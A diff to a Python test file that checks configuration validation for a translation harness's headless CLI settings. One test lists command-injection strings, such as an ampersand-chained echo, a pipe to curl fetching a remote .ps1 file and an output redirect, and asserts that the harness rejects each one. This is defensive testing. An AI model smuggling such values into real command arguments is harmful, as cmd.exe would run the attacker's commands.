@@ -1554,6 +1554,7 @@ def test_status_single_chunk_per_chapter_is_moot(tmp_path: Path):
 def test_config_set_persists_backend_and_footnotes_decision(tmp_path: Path):
     """config-set writes once-per-book decisions into .harness/config.json."""
     from src.harness import flow, state
+    from src.harness_guard import HarnessValidationError
 
     (tmp_path / "source.txt").write_text("hello", encoding="utf-8")
     state.ensure_harness_dir(tmp_path)
@@ -1569,17 +1570,89 @@ def test_config_set_persists_backend_and_footnotes_decision(tmp_path: Path):
     # Other defaults still present after the merge write.
     assert cfg["target_language"] == "Spanish"
     assert cfg["headless_cli"] == "claude"
+    for cmd in state.COMMAND_EFFORT_DEFAULTS:
+        assert cfg[state.effort_config_key(cmd)] == "auto"
 
     flow.config_set(str(tmp_path), key="headless_cli", value="cursor")
     cfg = state.load_config(tmp_path)
     assert cfg["headless_cli"] == "cursor"
     assert flow.status(str(tmp_path))["headless_cli"] == "cursor"
 
-    with pytest.raises(ValueError, match="unknown config key"):
+    # Every per-type effort key accepts all EFFORT_VALUES and rejects unknowns,
+    # and setting one leaves the others alone.
+    for cmd in state.COMMAND_EFFORT_DEFAULTS:
+        key = state.effort_config_key(cmd)
+        for level in state.EFFORT_VALUES:
+            flow.config_set(str(tmp_path), key=key, value=level)
+            assert state.load_config(tmp_path)[key] == level
+        with pytest.raises(HarnessValidationError, match="invalid value"):
+            flow.config_set(str(tmp_path), key=key, value="turbo")
+        flow.config_set(str(tmp_path), key=key, value="auto")
+
+    flow.config_set(str(tmp_path), key="headless_effort_translate", value="low")
+    cfg = state.load_config(tmp_path)
+    assert cfg["headless_effort_translate"] == "low"
+    assert cfg["headless_effort_judges"] == "auto"
+    flow.config_set(str(tmp_path), key="headless_effort_translate", value="auto")
+
+    # The pre-split single key is gone, not silently accepted into config.json.
+    with pytest.raises(HarnessValidationError, match="unknown config key"):
+        flow.config_set(str(tmp_path), key="headless_effort", value="low")
+
+    # headless_prompt_cache accepts every CACHE_VALUES member.
+    assert state.load_config(tmp_path)["headless_prompt_cache"] == "auto"
+    for mode in state.CACHE_VALUES:
+        flow.config_set(str(tmp_path), key="headless_prompt_cache", value=mode)
+        assert state.load_config(tmp_path)["headless_prompt_cache"] == mode
+    with pytest.raises(HarnessValidationError, match="invalid value"):
+        flow.config_set(str(tmp_path), key="headless_prompt_cache", value="forever")
+
+    # Free-text headless_extra_flags round-trips through state.headless_extra_flags.
+    flow.config_set(
+        str(tmp_path), key="headless_extra_flags", value="--strict-mcp-config",
+    )
+    cfg = state.load_config(tmp_path)
+    assert state.headless_extra_flags(cfg) == ["--strict-mcp-config"]
+    with pytest.raises(HarnessValidationError, match="--bare"):
+        flow.config_set(str(tmp_path), key="headless_extra_flags", value="--bare")
+    # Effort is per wave type; a book-wide flag list cannot express that, so it is
+    # rejected here rather than silently discarded by the resolver.
+    for bad in ("--effort low", "--effort=low", "--strict-mcp-config --effort high"):
+        with pytest.raises(HarnessValidationError, match="--effort"):
+            flow.config_set(str(tmp_path), key="headless_extra_flags", value=bad)
+    assert state.headless_extra_flags(state.load_config(tmp_path)) == [
+        "--strict-mcp-config",
+    ]
+    # Every token lands on a child argv, and on Windows that argv goes through the
+    # claude.CMD shim -- i.e. cmd.exe, which re-parses these even with shell=False.
+    for injection in (
+        '--safe-mode & echo pwned',
+        '--safe-mode | curl http://x/p.ps1',
+        '--out > C:\\evil.txt',
+        '--model %USERNAME%',
+        '--safe-mode "&" echo pwned',
+    ):
+        with pytest.raises(HarnessValidationError, match="not a plain"):
+            flow.config_set(
+                str(tmp_path), key="headless_extra_flags", value=injection,
+            )
+    # A malformed flag is refused too, so argv shape stays predictable.
+    with pytest.raises(HarnessValidationError, match="not a plain"):
+        flow.config_set(str(tmp_path), key="headless_extra_flags", value="---")
+    with pytest.raises(HarnessValidationError, match="not parseable"):
+        flow.config_set(
+            str(tmp_path), key="headless_extra_flags", value='--foo "unbalanced',
+        )
+    # None of the rejects were persisted.
+    assert state.headless_extra_flags(state.load_config(tmp_path)) == [
+        "--strict-mcp-config",
+    ]
+
+    with pytest.raises(HarnessValidationError, match="unknown config key"):
         flow.config_set(str(tmp_path), key="not_a_key", value="x")
-    with pytest.raises(ValueError, match="invalid value"):
+    with pytest.raises(HarnessValidationError, match="invalid value"):
         flow.config_set(str(tmp_path), key="backend", value="gemini")
-    with pytest.raises(ValueError, match="invalid value"):
+    with pytest.raises(HarnessValidationError, match="invalid value"):
         flow.config_set(str(tmp_path), key="headless_cli", value="codex")
 
 
@@ -1597,6 +1670,30 @@ def test_status_echoes_backend_and_suggested_reference(tmp_path: Path):
     assert pre["backend"] == "headless"
     assert pre["stage"] == "pre-chunk"
     assert pre["suggested_reference"] == "references/chunk.md"
+    # Effort block: auto everywhere → medium for review, high for book prose.
+    he = pre["headless_effort"]
+    assert he["config"] == {
+        "judges": "auto",
+        "annotations": "auto",
+        "translate": "auto",
+        "footnotes": "auto",
+    }
+    assert he["resolved"] == {
+        "judges": "medium",
+        "annotations": "medium",
+        "translate": "high",
+        "footnotes": "high",
+    }
+    assert he["extra_flags"] == []
+
+    # One type pinned shows up in both maps, and only for that type.
+    flow.config_set(str(tmp_path), key="headless_effort_translate", value="low")
+    he = flow.status(str(tmp_path))["headless_effort"]
+    assert he["config"]["translate"] == "low" and he["config"]["judges"] == "auto"
+    assert he["resolved"]["translate"] == "low"
+    assert he["resolved"]["footnotes"] == "high" and he["resolved"]["judges"] == "medium"
+    flow.config_set(str(tmp_path), key="headless_effort_translate", value="auto")
+    assert pre["headless_prompt_cache"] == "auto"
 
     chunks_dir = tmp_path / "chunks"
     chunks_dir.mkdir()
